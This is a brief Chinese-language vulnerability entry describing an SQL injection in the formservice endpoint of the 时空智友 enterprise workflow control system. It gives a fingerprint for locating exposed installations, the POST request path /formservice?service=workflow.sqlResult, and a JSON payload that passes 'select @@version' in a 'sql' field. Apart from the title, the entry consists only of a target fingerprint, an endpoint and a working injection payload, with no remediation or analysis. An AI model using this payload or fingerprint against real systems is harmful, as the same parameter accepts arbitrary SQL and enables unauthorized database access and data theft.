# 时空智友企业流程化管控系统formservice存在SQL注入漏洞

时空智友企业流程化管控系统 ｜ SQL注入 ｜ —
- **指纹**：`body="企业流程化管控系统"`
- **请求**：`POST /formservice?service=workflow.sqlResult HTTP/1.1`

**Payload**
```
{"params":{"a":"11"},"sql":"select @@version"}
```